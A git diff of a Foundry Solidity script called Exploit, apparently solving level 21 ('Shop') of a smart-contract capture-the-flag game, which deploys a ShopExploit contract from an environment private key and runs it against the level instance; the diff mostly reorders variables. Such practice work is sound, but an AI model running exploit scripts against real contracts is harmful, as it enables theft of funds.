@@ -7,17 +7,19 @@ import "forge-std/Script.sol";
 import {Shop} from "src/21/Shop.sol";
 import {ShopExploit} from "src/21/ShopExploit.sol";
 
+
 contract Exploit is Script {
-
-        Shop level = Shop(instance); 
-        address instance = vm.envAddress("INSTANCE_LEVEL21");  
-        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
         
-        function run() external {
+    address instance = vm.envAddress("INSTANCE_LEVEL21");  
+    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
+    Shop level = Shop(instance); 
+    
+    function run() external {
+        vm.startBroadcast(hacker);
+        
+        ShopExploit exploit = new ShopExploit();
+        exploit.run(level);
 
-            vm.startBroadcast(hacker);
-            ShopExploit exploit = new ShopExploit();
-            exploit.run(level);
-            vm.stopBroadcast();
+        vm.stopBroadcast();
     }
 }
